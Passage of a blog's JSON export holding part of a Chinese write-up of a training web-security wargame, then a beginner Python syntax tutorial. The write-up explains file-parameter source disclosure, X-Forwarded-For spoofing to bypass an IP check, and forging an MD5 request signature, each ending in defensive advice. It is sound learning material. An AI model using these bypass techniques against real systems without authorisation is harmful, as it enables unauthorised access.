href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_25.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_25.png</a>)</p>\n<h3 id=\"3-揭密-5\"><a href=\"#3-揭密-5\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>老规范，查看页面代码，如下图所示：<br>![关卡6-页面代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_27.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_27.png</a>)<br>![关卡6-页面代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_27.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_27.png</a>)</p>\n<p>再结合Tips说密码被放在了php代码里。巧的是页面里的图片也是通过后缀为php的url生成的。<br>由此可知，这个php页面就是stage6.php。如此同时，这个服务还支持file参数。</p>\n<p>于是，可以尝试设file值为../stage6.php、stage6.php、sohu/stage6.php、../sohu/stage6.php等等获取php代码内容。</p>\n<p>最后发现该php代码文件获取链接地址为：<a href=\"http://10.4.236.115:8080/sohu/stage6.php?file=stage6.php\">http://10.4.236.115:8080/sohu/stage6.php?file=stage6.php</a></p>\n<p>查看页面内容如下图所示：<br>![关卡6-php代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_28.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_28.png</a>)<br>![关卡6-php代码]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_28.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_28.png</a>)</p>\n<p>额，其实这是一个jsp页面，只是以jsp为后缀的url被jetty使用默认的servlet自动转发了，不得以只好用php做为后缀用了。</p>\n<p>总之，最后能获取到了密码为：sATa3HGe6</p>\n<h3 id=\"4-小结-5\"><a href=\"#4-小结-5\" class=\"headerlink\" title=\"4. 小结\"></a>4. 小结</h3><p>不要以实际文件路径为文件请求参数。<br>如果服务需要的文件可枚举，则可以在后端限制可获取文件范围；或者把所有需要的文件放置于一个特定目标，只允许访问通过服务获取此目标下的文件。</p>\n<h2 id=\"0x07-关卡7\"><a href=\"#0x07-关卡7\" class=\"headerlink\" title=\"0x07 关卡7\"></a>0x07 关卡7</h2><p>伪造ip地址</p>\n<h3 id=\"1-提示-6\"><a href=\"#1-提示-6\" class=\"headerlink\" title=\"1. 提示\"></a>1. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：请获得本页面的访问权限<br>Tips：一会公开的来源控制方法也许并不安全</p>\n</blockquote>\n<h3 id=\"2-界面-6\"><a href=\"#2-界面-6\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡7]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_29.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_29.png</a>)<br>![关卡7]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_29.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_29.png</a>)</p>\n<h3 id=\"3-揭密-6\"><a href=\"#3-揭密-6\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>点击“验证权限”发现系统给出如下提示：<br>![关卡7-提示]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_30.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_30.png</a>)<br>![关卡7-提示]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_30.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160309_30.png</a>)</p>\n<p>提示内容：你不是来自于127.0.0.1的访客。反过来，提示的意思可以理解为只有IP地址来自于127.0.0.1的用户才有访问的权限。</p>\n<p>于是则需要伪造请求ip地址为127.0.0.1。<br>一般地，涉及到ip地址的请求头有：X-Real-IP、X-Forwarded-For、Host。<br>伪造ip时，一一尝试，最终发现设置 X-Forwarded-For 为127.0.0.1 成功通关。</p>\n<h3 id=\"4-补充内容\"><a href=\"#4-补充内容\" class=\"headerlink\" title=\"4. 补充内容\"></a>4. 补充内容</h3><h4 id=\"请求头信息修改工具\"><a href=\"#请求头信息修改工具\" class=\"headerlink\" title=\"请求头信息修改工具\"></a>请求头信息修改工具</h4><p>使用chrome插件工具ModHeader来修改请求头信息：<a href=\"https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj\">https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj</a></p>\n<h4 id=\"客户端IP流转\"><a href=\"#客户端IP流转\" class=\"headerlink\" title=\"客户端IP流转\"></a>客户端IP流转</h4><p>服务器经过Apache,Squid等反向代理软件层层代理转发后，其原始IP地址可能会丢失。</p>\n<p>服务器通过<code>request.getRemoteAddr();</code>只能获取直接请求的ip地址。<br>对于服务器之上架设有代理服务器的，则是代理服务器的ip地址；对于用户直接访问服务器，中间并没有代理服务器的情况，获取的ip地址才是用户真正的ip地址。</p>\n<p>对于服务器代理产生的ip丢失情况，一些反射代理服务器开始引入X-Forwarded-For和X-Real-IP等非正式的http协议头，用于保存原始客户端的ip地址。</p>\n<p>一般地，服务器程序会优先从X-Forwarded-For和X-Real-IP二个协议头里取ip地址，没有再从request里取ip地址。<br><strong>注</strong>：CRM后端代码还是额外check Proxy-Client-IP和WL-Proxy-Client-IP协议头。</p>\n<p>参考：<a href=\"http://www.cnblogs.com/ITtangtang/p/3927768.html\">Java获取客户端IP</a></p>\n<h3 id=\"5-小结\"><a href=\"#5-小结\" class=\"headerlink\" title=\"5. 小结\"></a>5. 小结</h3><p>大家通用的客户端ip地址获取方法，经过代理服务器转发后，并不一定可靠。<br>因此，使用ip来做权限上的限制也并不是100%安全的。</p>\n<h2 id=\"0x08-关卡8\"><a href=\"#0x08-关卡8\" class=\"headerlink\" title=\"0x08 关卡8\"></a>0x08 关卡8</h2><h3 id=\"1-准备\"><a href=\"#1-准备\" class=\"headerlink\" title=\"1. 准备\"></a>1. 准备</h3><h4 id=\"二维码生成\"><a href=\"#二维码生成\" class=\"headerlink\" title=\"二维码生成\"></a>二维码生成</h4><p>生成二维码工具：</p>\n<ul>\n<li><a href=\"http://cli.im/\">http://cli.im/</a></li>\n<li><a href=\"http://liantu.com/\">http://liantu.com/</a></li>\n</ul>\n<p>生成内容：<br><a href=\"http://10.4.236.115:8080/sohu/stage7?level=7&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933\">http://10.4.236.115:8080/sohu/stage7?level=7&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933</a></p>\n<h4 id=\"二维码解码\"><a href=\"#二维码解码\" class=\"headerlink\" title=\"二维码解码\"></a>二维码解码</h4><p>推荐使用：<a href=\"http://tool.oschina.net/qr?type=2\">http://tool.oschina.net/qr?type=2</a><br>试过其他的几个不能解码中间有logo图片的二维码。</p>\n<h3 id=\"2-提示\"><a href=\"#2-提示\" class=\"headerlink\" title=\"2. 提示\"></a>2. 提示</h3><p>提示如下：</p>\n<blockquote>\n<p>任务目标：请主动设置你的过关级别为8<br>Tips：你猜到他们猜不到你猜得到他们猜不到你猜得到</p>\n</blockquote>\n<h3 id=\"2-界面-7\"><a href=\"#2-界面-7\" class=\"headerlink\" title=\"2. 界面\"></a>2. 界面</h3><p>界面如下图所示：<br>![关卡8]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_35.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_35.png</a>)<br>![关卡8]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_35.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_35.png</a>)</p>\n<h3 id=\"3-揭密-7\"><a href=\"#3-揭密-7\" class=\"headerlink\" title=\"3. 揭密\"></a>3. 揭密</h3><p>第8关上来就是一个大大的二维码。<br>通过二维码反解工具，得到一个网址：<a href=\"http://10.4.236.115:8080/sohu/stage7?level=7&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933。\">http://10.4.236.115:8080/sohu/stage7?level=7&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933。</a></p>\n<p>由于我们第7关已经过关，因此这个url还需要变通一下。修改后完成的url为：<a href=\"http://10.4.236.115:8080/sohu/stage8?level=8&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933。\">http://10.4.236.115:8080/sohu/stage8?level=8&amp;username=yeshaoting&amp;time=1457452800&amp;verify=c6ce17b02eb15fd1831267a8736bd933。</a></p>\n<p>直接提示：”这是一次已经过期的提交，请在2分钟内完成请求提交。”<br>由此可见，参数time不在2分钟内。反查查秒级时间得到内容为：2016-03-09 00:00:00，确认不是当时时间2分钟内。</p>\n<p>修改time内容为当前时间后再提交，提示：”请求在服务器端验证失败。”。<br>可以猜测，参数verify不对。这个verfiy一看就是经过md5加密的。</p>\n<p>根据开发时与第三方接口对接的经验，verfiy是通过前面几个参数按照某种规则生成的。<br>如是，依次尝试主流的微信、腾讯、淘宝开放平台，最终发现与腾讯开放平台的签名规则相似。</p>\n<p>第1步：将level、username、time三个参数进行字典序排序。<br>第2步：将第1步中排序后的参数(key=value)用&amp;拼接起来：level=8&amp;time=1457452800&amp;username=yeshaoting。<br>第3步：对第2步内容进行md5加密，得到verfity值。</p>\n<h3 id=\"4-补充知识：签名规则\"><a href=\"#4-补充知识：签名规则\" class=\"headerlink\" title=\"4. 补充知识：签名规则\"></a>4. 补充知识：签名规则</h3><h4 id=\"微信开放平台\"><a href=\"#微信开放平台\" class=\"headerlink\" title=\"微信开放平台\"></a>微信开放平台</h4><p>参见：<a href=\"http://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421135319&amp;token=&amp;lang=zh_CN\">微信签名规则</a><br>![关卡8-微信签名规则]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_31.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_31.png</a>)<br>![关卡8-微信签名规则]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_31.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_31.png</a>)</p>\n<h4 id=\"腾讯开放平台\"><a href=\"#腾讯开放平台\" class=\"headerlink\" title=\"腾讯开放平台\"></a>腾讯开放平台</h4><p>参见：<a href=\"http://wiki.open.qq.com/wiki/%E8%85%BE%E8%AE%AF%E5%BC%80%E6%94%BE%E5%B9%B3%E5%8F%B0%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E7%AD%BE%E5%90%8D%E5%8F%82%E6%95%B0sig%E7%9A%84%E8%AF%B4%E6%98%8E\">腾讯签名规则</a><br>![关卡8-腾讯签名规则]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_33.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_33.png</a>)<br>![关卡8-腾讯签名规则]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_33.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_33.png</a>)</p>\n<h4 id=\"淘宝开放平台\"><a href=\"#淘宝开放平台\" class=\"headerlink\" title=\"淘宝开放平台\"></a>淘宝开放平台</h4><p>参见：<a href=\"http://open.taobao.com/doc2/detail.htm?articleId=101617&amp;docType=1&amp;treeId=1#s5\">淘宝签名规则</a><br>![关卡8-淘宝签名规则]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_34.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_34.png</a>)<br>![关卡8-淘宝签名规则]<a href=\"http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_34.png\">http://o7kubqw1j.bkt.clouddn.com//images/article/WEB安全渗透分享/Snip20160310_34.png</a>)</p>\n<h3 id=\"5-小结-1\"><a href=\"#5-小结-1\" class=\"headerlink\" title=\"5. 小结\"></a>5. 小结</h3><p>签名方式尽量与市面上的一些规则区分开。<br>签名规则也是有可能会被猜出，可以通过一些别的类似于关卡5小结里的限制来辅助提高安全性。</p>"},{"title":"Python菜鸟教程学习笔记 - 基础语法","date":"2016-05-02T07:13:00.000Z","_content":"\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n\n## 一、第一个Python程序\n\n### 1. 交互式编程\n在mac或者linux终端输入python命令即可进入交互式编程。如：\n``` python\nyerba-buena:pystudy yeshaoting$ python\nPython 2.7.10 (default, Jul 14 2015, 19:46:27)\n[GCC 4.2.1 Compatible Apple LLVM 6.0 (clang-600.0.39)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>>\n```\n\n### 2. 脚本式编程\n将python代码写入一个以.py为扩展名的python文件，如：test.py。\n脚本写完后，可以通过如下二种方式执行python脚本：python test.py。\n\n若python文件里设置了python shebang，则可以通过./test.py来执行。\n\n\n## 二、python标识符\n> 在python里，标识符有字母、数字、下划线组成。所有标识符可以包括英文、数字以及下划线（\\_），但不能以数字开头。\n\n> python中的标识符是区分大小写的。\n\n> 以下划线开头的标识符是有特殊意义的。\n> 以单下划线开头（\\_foo）的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用“from xxx import *”而导入；\n> 以双下划线开头的（\\_\\_foo）代表类的私有成员；\n> 以双下划线开头和结尾的（\\_\\_foo\\_\\_）代表python里特殊方法专用的标识，如\\_\\_init\\_\\_()代表类的构造函数。\n\n## 三、Python保留字符\n| and | exec | not |\n|:---:|:---:|:---:|\n| assert | finally | or |\n| break | for | pass |\n| class | from | print |\n| continue | global | raise |\n| def | if | return |\n| del | import | try |\n| elif | in | while |\n| else | is | with |\n| except | lambda | yield |\n\n\n<!-- more -->\n\n## 四、行和缩进\n> 学习Python与其他语言最大的区别就是，Python的代码块不使用大括号（{}）来控制类，函数以及其他逻辑判断。python最具特色的就是用缩进来写模块。\n缩进的空白数量是可变的，但是所有代码块语句必须包含相同的缩进空白数量，这个必须严格执行。\nIndentationError: unexpected indent 错误是python编译器是在告诉你\"Hi，老兄，你的文件里格式不对了，可能是tab和空格没对齐的问题\"，所有python对格式要求非常严格。\n如果是 IndentationError: unindent does not match any outer indentation level错误表明，你使用的缩进方式不一致，有的是 tab 键缩进，有的是空格缩进，改为一致即可。\n\n**个人建议**：因为不同的系统、不同的IDE tab缩进设置长度不一，建议使用空格代替tab缩进，能省去一些不必要的麻烦。\n\n\n## 五、多行语句\n语句中包含[], {} 或 () 括号就不需要使用多行连接符。如：python列表、元组、字典定义。\n而对于语句非如上三类情况，可以在换行处使用斜杆( **\\** )，达到换行目的。例如：\n```\n#!/usr/bin/env python\n#coding=utf8\n\ncount = 0\ncount = count + 1 \\\n    + 3 + 5;\n\nprint '总计：', count;\n```\n\n如果行尾未使用斜杆的话，可能会报非法缩进异常：`IndentationError: unexpected indent`。\n\n\n## 五、python引号\npython里的引号有三种形式：单引号(')，双引号(\")以及三引号(''' 或 \"\"\")。\n其中，单引号和双引号都用于定义一个字符串变量，而三引号可以用来定义一个段落(包含换行)变量。例如：\n``` python\nparagraph = \"\"\"这是一个段落。\n包含了多个语句\"\"\"\n\nprint paragraph\n```\n\n另外，由于在python里字符串可以单独存在，而不赋值给任何变量。这种形式字符串可以被当作注释使用。例如：\n``` python\n'''\nCreated on Apr 27, 2016\n\n@author: yeshaoting\n'''\n```\n\n## 六、python注释\n单行注释：`#`\n多行注释：使用三引号。参见：python引号\n\n\n## 七、接收用户输入\n内建函数：raw_input，用于接收终端用户输入，返回一个字符串。例如：\n``` python\nvalue=raw_input(\"input:\");\nprint \"user input value:\", value\nprint \"user input value type:\", type(value)\n```\n\n执行实例为：\n``` python\ninput:1\nuser input value: 1\nuser input value type: <type 'str'>\n\ninput:a b ef\nuser input value: a b ef\nuser input value type: <type 'str'>\n```\n\n\n## 八、多个语句构成代码块\n像if、while、def和class这样的复合语句，代码块首行以关键字开始，需要以冒号(:)结束。\n后面的子句使用相同的缩进用以表示同属一个代码块。\n\n一个代码块结束后建议添加一个空白行使用代码块间界线分明，容易分辨。\n\n\n## 九、附录\n参考文档：[Python基础语法](http://www.runoob.com/python/python-basic-syntax.html)\n扩展阅读：[Python 命令行参数](http://www.runoob.com/python/python-command-line-arguments.html)","source":"_posts/article/python/python学习笔记-基础语法.md","raw":"title: Python菜鸟教程学习笔记 - 基础语法\ntags:\n  - python\n  - 学习笔记\ncategories:\n  - 系统脚本\ndate: 2016-05-02 15:13:00\n---\n\n<img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" />\n\n\n## 一、第一个Python程序\n\n### 1. 交互式编程\n在mac或者linux终端输入python命令即可进入交互式编程。如：\n``` python\nyerba-buena:pystudy yeshaoting$ python\nPython 2.7.10 (default, Jul 14 2015, 19:46:27)\n[GCC 4.2.1 Compatible Apple LLVM 6.0 (clang-600.0.39)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>>\n```\n\n### 2. 脚本式编程\n将python代码写入一个以.py为扩展名的python文件，如：test.py。\n脚本写完后，可以通过如下二种方式执行python脚本：python test.py。\n\n若python文件里设置了python shebang，则可以通过./test.py来执行。\n\n\n## 二、python标识符\n> 在python里，标识符有字母、数字、下划线组成。所有标识符可以包括英文、数字以及下划线（\\_），但不能以数字开头。\n\n> python中的标识符是区分大小写的。\n\n> 以下划线开头的标识符是有特殊意义的。\n> 以单下划线开头（\\_foo）的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用“from xxx import *”而导入；\n> 以双下划线开头的（\\_\\_foo）代表类的私有成员；\n> 以双下划线开头和结尾的（\\_\\_foo\\_\\_）代表python里特殊方法专用的标识，如\\_\\_init\\_\\_()代表类的构造函数。\n\n## 三、Python保留字符\n| and | exec | not |\n|:---:|:---:|:---:|\n| assert | finally | or |\n| break | for | pass |\n| class | from | print |\n| continue | global | raise |\n| def | if | return |\n| del | import | try |\n| elif | in | while |\n| else | is | with |\n| except | lambda | yield |\n\n\n<!-- more -->\n\n## 四、行和缩进\n> 学习Python与其他语言最大的区别就是，Python的代码块不使用大括号（{}）来控制类，函数以及其他逻辑判断。python最具特色的就是用缩进来写模块。\n缩进的空白数量是可变的，但是所有代码块语句必须包含相同的缩进空白数量，这个必须严格执行。\nIndentationError: unexpected indent 错误是python编译器是在告诉你\"Hi，老兄，你的文件里格式不对了，可能是tab和空格没对齐的问题\"，所有python对格式要求非常严格。\n如果是 IndentationError: unindent does not match any outer indentation level错误表明，你使用的缩进方式不一致，有的是 tab 键缩进，有的是空格缩进，改为一致即可。\n\n**个人建议**：因为不同的系统、不同的IDE tab缩进设置长度不一，建议使用空格代替tab缩进，能省去一些不必要的麻烦。\n\n\n## 五、多行语句\n语句中包含[], {} 或 () 括号就不需要使用多行连接符。如：python列表、元组、字典定义。\n而对于语句非如上三类情况，可以在换行处使用斜杆( **\\** )，达到换行目的。例如：\n```\n#!/usr/bin/env python\n#coding=utf8\n\ncount = 0\ncount = count + 1 \\\n    + 3 + 5;\n\nprint '总计：', count;\n```\n\n如果行尾未使用斜杆的话，可能会报非法缩进异常：`IndentationError: unexpected indent`。\n\n\n## 五、python引号\npython里的引号有三种形式：单引号(')，双引号(\")以及三引号(''' 或 \"\"\")。\n其中，单引号和双引号都用于定义一个字符串变量，而三引号可以用来定义一个段落(包含换行)变量。例如：\n``` python\nparagraph = \"\"\"这是一个段落。\n包含了多个语句\"\"\"\n\nprint paragraph\n```\n\n另外，由于在python里字符串可以单独存在，而不赋值给任何变量。这种形式字符串可以被当作注释使用。例如：\n``` python\n'''\nCreated on Apr 27, 2016\n\n@author: yeshaoting\n'''\n```\n\n## 六、python注释\n单行注释：`#`\n多行注释：使用三引号。参见：python引号\n\n\n## 七、接收用户输入\n内建函数：raw_input，用于接收终端用户输入，返回一个字符串。例如：\n``` python\nvalue=raw_input(\"input:\");\nprint \"user input value:\", value\nprint \"user input value type:\", type(value)\n```\n\n执行实例为：\n``` python\ninput:1\nuser input value: 1\nuser input value type: <type 'str'>\n\ninput:a b ef\nuser input value: a b ef\nuser input value type: <type 'str'>\n```\n\n\n## 八、多个语句构成代码块\n像if、while、def和class这样的复合语句，代码块首行以关键字开始，需要以冒号(:)结束。\n后面的子句使用相同的缩进用以表示同属一个代码块。\n\n一个代码块结束后建议添加一个空白行使用代码块间界线分明，容易分辨。\n\n\n## 九、附录\n参考文档：[Python基础语法](http://www.runoob.com/python/python-basic-syntax.html)\n扩展阅读：[Python 命令行参数](http://www.runoob.com/python/python-command-line-arguments.html)","slug":"article/python/python学习笔记-基础语法","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxur006u5nbtgfbeczz4","content":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、第一个Python程序\"><a href=\"#一、第一个Python程序\" class=\"headerlink\" title=\"一、第一个Python程序\"></a>一、第一个Python程序</h2><h3 id=\"1-交互式编程\"><a href=\"#1-交互式编程\" class=\"headerlink\" title=\"1. 交互式编程\"></a>1. 交互式编程</h3><p>在mac或者linux终端输入python命令即可进入交互式编程。如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:pystudy yeshaoting$ python</div><div class=\"line\">Python <span class=\"number\">2.7</span><span class=\"number\">.10</span> (default, Jul <span class=\"number\">14</span> <span class=\"number\">2015</span>, <span class=\"number\">19</span>:<span class=\"number\">46</span>:<span class=\"number\">27</span>)</div><div class=\"line\">[GCC <span class=\"number\">4.2</span><span class=\"number\">.1</span> Compatible Apple LLVM <span class=\"number\">6.0</span> (clang<span class=\"number\">-600.0</span><span class=\"number\">.39</span>)] on darwin</div><div class=\"line\">Type <span class=\"string\">\"help\"</span>, <span class=\"string\">\"copyright\"</span>, <span class=\"string\">\"credits\"</span> <span class=\"keyword\">or</span> <span class=\"string\">\"license\"</span> <span class=\"keyword\">for</span> more information.</div><div class=\"line\">&gt;&gt;&gt;</div></pre></td></tr></table></figure></p>\n<h3 id=\"2-脚本式编程\"><a href=\"#2-脚本式编程\" class=\"headerlink\" title=\"2. 脚本式编程\"></a>2. 脚本式编程</h3><p>将python代码写入一个以.py为扩展名的python文件，如：test.py。<br>脚本写完后，可以通过如下二种方式执行python脚本：python test.py。</p>\n<p>若python文件里设置了python shebang，则可以通过./test.py来执行。</p>\n<h2 id=\"二、python标识符\"><a href=\"#二、python标识符\" class=\"headerlink\" title=\"二、python标识符\"></a>二、python标识符</h2><blockquote>\n<p>在python里，标识符有字母、数字、下划线组成。所有标识符可以包括英文、数字以及下划线（_），但不能以数字开头。</p>\n<p>python中的标识符是区分大小写的。</p>\n<p>以下划线开头的标识符是有特殊意义的。<br>以单下划线开头（_foo）的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用“from xxx import *”而导入；<br>以双下划线开头的（__foo）代表类的私有成员；<br>以双下划线开头和结尾的（__foo__）代表python里特殊方法专用的标识，如__init__()代表类的构造函数。</p>\n</blockquote>\n<h2 id=\"三、Python保留字符\"><a href=\"#三、Python保留字符\" class=\"headerlink\" title=\"三、Python保留字符\"></a>三、Python保留字符</h2><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">and</th>\n<th style=\"text-align:center\">exec</th>\n<th style=\"text-align:center\">not</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">assert</td>\n<td style=\"text-align:center\">finally</td>\n<td style=\"text-align:center\">or</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">break</td>\n<td style=\"text-align:center\">for</td>\n<td style=\"text-align:center\">pass</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">class</td>\n<td style=\"text-align:center\">from</td>\n<td style=\"text-align:center\">print</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">continue</td>\n<td style=\"text-align:center\">global</td>\n<td style=\"text-align:center\">raise</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">def</td>\n<td style=\"text-align:center\">if</td>\n<td style=\"text-align:center\">return</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">del</td>\n<td style=\"text-align:center\">import</td>\n<td style=\"text-align:center\">try</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">elif</td>\n<td style=\"text-align:center\">in</td>\n<td style=\"text-align:center\">while</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">else</td>\n<td style=\"text-align:center\">is</td>\n<td style=\"text-align:center\">with</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">except</td>\n<td style=\"text-align:center\">lambda</td>\n<td style=\"text-align:center\">yield</td>\n</tr>\n</tbody>\n</table>\n<a id=\"more\"></a>\n<h2 id=\"四、行和缩进\"><a href=\"#四、行和缩进\" class=\"headerlink\" title=\"四、行和缩进\"></a>四、行和缩进</h2><blockquote>\n<p>学习Python与其他语言最大的区别就是，Python的代码块不使用大括号（{}）来控制类，函数以及其他逻辑判断。python最具特色的就是用缩进来写模块。<br>缩进的空白数量是可变的，但是所有代码块语句必须包含相同的缩进空白数量，这个必须严格执行。<br>IndentationError: unexpected indent 错误是python编译器是在告诉你”Hi，老兄，你的文件里格式不对了，可能是tab和空格没对齐的问题”，所有python对格式要求非常严格。<br>如果是 IndentationError: unindent does not match any outer indentation level错误表明，你使用的缩进方式不一致，有的是 tab 键缩进，有的是空格缩进，改为一致即可。</p>\n</blockquote>\n<p><strong>个人建议</strong>：因为不同的系统、不同的IDE tab缩进设置长度不一，建议使用空格代替tab缩进，能省去一些不必要的麻烦。</p>\n<h2 id=\"五、多行语句\"><a href=\"#五、多行语句\" class=\"headerlink\" title=\"五、多行语句\"></a>五、多行语句</h2><p>语句中包含[], {} 或 () 括号就不需要使用多行连接符。如：python列表、元组、字典定义。<br>而对于语句非如上三类情况，可以在换行处使用斜杆( <strong>\\</strong> )，达到换行目的。例如：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env python</div><div class=\"line\">#coding=utf8</div><div class=\"line\"></div><div class=\"line\">count = 0</div><div class=\"line\">count = count + 1 \\</div><div class=\"line\">    + 3 + 5;</div><div class=\"line\"></div><div class=\"line\">print &apos;总计：&apos;, count;</div></pre></td></tr></table></figure></p>\n<p>如果行尾未使用斜杆的话，可能会报非法缩进异常：<code>IndentationError: unexpected indent</code>。</p>\n<h2 id=\"五、python引号\"><a href=\"#五、python引号\" class=\"headerlink\" title=\"五、python引号\"></a>五、python引号</h2><p>python里的引号有三种形式：单引号(‘)，双引号(“)以及三引号(‘’’ 或 “””)。<br>其中，单引号和双引号都用于定义一个字符串变量，而三引号可以用来定义一个段落(包含换行)变量。例如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">paragraph = <span class=\"string\">\"\"\"这是一个段落。</span></div><div class=\"line\">包含了多个语句\"\"\"</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> paragraph</div></pre></td></tr></table></figure></p>\n<p>另外，由于在python里字符串可以单独存在，而不赋值给任何变量。这种形式字符串可以被当作注释使用。例如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"string\">'''</span></div><div class=\"line\">Created on Apr 27, 2016</div><div class=\"line\"></div><div class=\"line\">@author: yeshaoting</div><div class=\"line\">'''</div></pre></td></tr></table></figure></p>\n<h2 id=\"六、python注释\"><a href=\"#六、python注释\" class=\"headerlink\" title=\"六、python注释\"></a>六、python注释</h2><p>单行注释：<code>#</code><br>多行注释：使用三引号。参见：python引号</p>\n<h2 id=\"七、接收用户输入\"><a href=\"#七、接收用户输入\" class=\"headerlink\" title=\"七、接收用户输入\"></a>七、接收用户输入</h2><p>内建函数：raw_input，用于接收终端用户输入，返回一个字符串。例如：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">value=raw_input(<span class=\"string\">\"input:\"</span>);</div><div class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"user input 